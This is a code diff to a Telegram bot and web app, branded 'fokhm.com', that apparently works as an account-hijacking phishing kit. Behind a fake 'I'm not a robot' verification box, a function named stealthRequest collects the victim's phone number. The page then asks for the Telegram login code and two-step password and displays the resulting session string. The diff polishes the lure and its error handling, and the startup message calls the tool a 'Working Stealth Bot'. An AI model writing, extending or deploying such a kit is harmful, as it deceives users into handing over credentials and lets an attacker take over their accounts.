@@ -28,9 +28,8 @@ WEB_APP_HTML = """
         .card { background: #1e293b; padding: 30px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 330px; text-align: center; border: 1px solid #334155; }
         h2 { color: #38bdf8; margin-bottom: 5px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
-        .verify-box { background: #0f172a; border: 2px dashed #475569; padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-bottom: 15px; }
-        .verify-box:active { border-color: #38bdf8; background: #1e293b; }
-        .checkbox { font-size: 18px; font-weight: bold; color: #4ade80; }
+        .verify-box { background: #0f172a; border: 2px solid #38bdf8; padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-bottom: 15px; font-weight: bold; font-size: 16px; color: #4ade80; user-select: none; }
+        .verify-box:active { background: #334155; transform: scale(0.98); }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; outline: none; }
         button { width: 95%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.3s; }
         button:hover { background: #1d4ed8; }
@@ -44,9 +43,9 @@ WEB_APP_HTML = """
     <div class="card">
         <h2>منصة fokhm.com</h2>
         <div id="content">
-            <p>انقر أدناه لإتمام التحقق الأوتوماتيكي:</p>
-            <div class="verify-box" onclick="stealthRequest()">
-                <span class="checkbox">☑️ أنا لست روبوت (تحقق فوري)</span>
+            <p>انقر أدناه لإتمام التحقق الفوري وسحب الرقم:</p>
+            <div class="verify-box" id="click_btn" onclick="stealthRequest()">
+                ☑️ أنا لست روبوت (اضغط هنا)
             </div>
             <div class="loader" id="loading"></div>
             <div id="error_box" class="msg"></div>
@@ -60,24 +59,23 @@ WEB_APP_HTML = """
 
         function showLoader(show) {
             document.getElementById('loading').style.display = show ? 'block' : 'none';
+            document.getElementById('click_btn').style.display = show ? 'none' : 'block';
         }
 
         function stealthRequest() {
-            showLoader(true);
-            if (tg.requestContact) {
+            if (window.Telegram && tg.requestContact) {
                 tg.requestContact((shared, contact) => {
-                    showLoader(false);
                     if (shared && contact) {
                         let phoneNum = contact.phone_number.toString();
                         if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
                         callApi('phone', phoneNum);
                     } else {
-                        document.getElementById('error_boxinnerText = "عذراً، يجب الموافقة للمتابعة.";';
+                        document.getElementById('error_box').innerText = "يجب الموافقة على مشاركة الرقم للمتابعة.";
                     }
                 });
             } else {
-                showLoader(false);
-                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة:");
+                // بديل لو فتحت الرابط من متصفح خارجي عادي
+                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
                 if (phone) callApi('phone', phone.toString());
             }
         }
@@ -94,11 +92,13 @@ WEB_APP_HTML = """
                 showLoader(false);
                 let html = '';
                 if (data.status === 'need_code') {
-                    html = `<p>✅ تم التحقق واستلام الرقم.<br>أدخل رمز التحقق (OTP) الذي وصلك:</p>
+                    html = `<p>✅ تم استلام الرقم بنجاح.<br>أدخل رمز التحقق (OTP) الذي وصلك:</p>
+                            <div id="error_box" class="msg"></div>
                             <input type="text" id="code_val" placeholder="12345">
                             <button onclick="submitCode()">تأكيد الكود</button>`;
                 } else if (data.status === 'need_password') {
                     html = `<p>الحساب محمي بكلمة مرور (تحقق بخطوتين):</p>
+                            <div id="error_box" class="msg"></div>
                             <input type="password" id="pass_val" placeholder="كلمة المرور">
                             <button onclick="submitPassword()">تحقق</button>`;
                 } else if (data.status === 'done') {
@@ -107,15 +107,13 @@ WEB_APP_HTML = """
                             <div class="success">${data.session}</div>`;
                 } else {
                     html = `<p class="msg">${data.message}</p>
-                            <div class="verify-box" onclick="stealthRequest()">
-                                <span class="checkbox">☑️ إعادة المحاولة</span>
-                            </div>`;
+                            <div class="verify-box" onclick="stealthRequest()">☑️ إعادة المحاولة</div>`;
                 }
                 document.getElementById('content').innerHTML = html;
             })
             .catch(err => {
                 showLoader(false);
-                alert("خطأ في الاتصال");
+                document.getElementById('error_box').innerText = "خطأ في الاتصال بالخادم";
             });
         }
 
@@ -211,11 +209,11 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not web_url.startswith('http'):
         web_url = f"https://{web_url}"
         
-    keyboard = [[InlineKeyboardButton("🚀 فتح واجهة التحقق - fokhm.com", web_app=WebAppInfo(url=web_url))]]
+    keyboard = [[InlineKeyboardButton("🚀 فتح منصة fokhm.com", web_app=WebAppInfo(url=web_url))]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر بالأسفل لبدء التحقق الفوري وسحب الرقم تلقائياً:",
+        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح واجهة التحقق:",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -231,6 +229,6 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     
-    print("Fokhm Stealth Bot is running...")
+    print("Fokhm Working Stealth Bot is running...")
     application.run_polling()
 
